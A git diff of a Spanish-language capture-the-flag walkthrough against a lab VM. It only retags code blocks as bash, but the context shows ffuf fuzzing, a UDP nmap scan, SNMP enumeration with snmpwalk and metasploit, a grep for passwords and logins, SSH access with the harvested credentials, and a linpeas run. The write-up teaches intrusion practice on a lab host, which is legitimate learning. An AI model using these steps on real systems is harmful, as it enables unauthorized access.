@@ -37,7 +37,7 @@ En `index.html` no hay nada especial, ni en la propia página ni en su código.
 
 Usamos `fuff` para intentar extraer más páginas con `fuff -w /usr/share/wordlists/apache.txt -u http://192.168.0.70/FUZZ -v`
 
-```
+```bash
  [2K[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4ms] [0m
 
  [2K| URL | http://192.168.0.70//.htaccess.bak
@@ -84,7 +84,7 @@ En la página principal dicen " The quieter you become, the more you are able to
 
 Intentamos varios escaneos silenciosos, finalmente, con `-sU` descubrimos un puerto adicional:
 
-```
+```bash
 PORT    STATE SERVICE VERSION
 161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
 MAC Address: 08:00:27:29:39:44 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
@@ -93,7 +93,7 @@ MAC Address: 08:00:27:29:39:44 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
 Podemos usar `snmpwalk -vc2 -c public <ip>` para comunicarnos con el o un modulo de metasploit asi:
 
-```
+```bash
 msfconsole
 use auxiliary/scanner/snmp/snmp_enum
 set RHOST 192.168.0.66
@@ -103,7 +103,7 @@ run
 
 Podemos filtrar con grep:
 
-```
+```bash
  datadiego@debian  yuan113  main  18:02  snmpwalk -v2c -c public 192.168.0.66 | grep -i -E "user|pass|login|ssh|path|home"
 iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
 iso.3.6.1.2.1.25.4.2.1.2.384 = STRING: "systemd-logind"
@@ -117,7 +117,7 @@ Obtenemos un usuario y contraseña
 
 Probamos el usuario en el servicio SSH:
 
-```
+```bash
  datadiego@debian  ~  18:04  ssh welcome@192.168.0.66
 The authenticity of host '192.168.0.66 (192.168.0.66)' can't be established.
 ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
@@ -154,7 +154,7 @@ Descargamos linpeas en la maquina con wget y lo ejecutamos.
 
 Hay algunos archivos interesantes:
 
-```
+```bash
 ╔══════════╣ Executable files potentially added by user (limit 70) (T1083)
 2026-01-14+08:36:37.6678938600 /usr/bin/mazesec
 2026-01-14+08:35:06.7202883520 /opt/113.sh
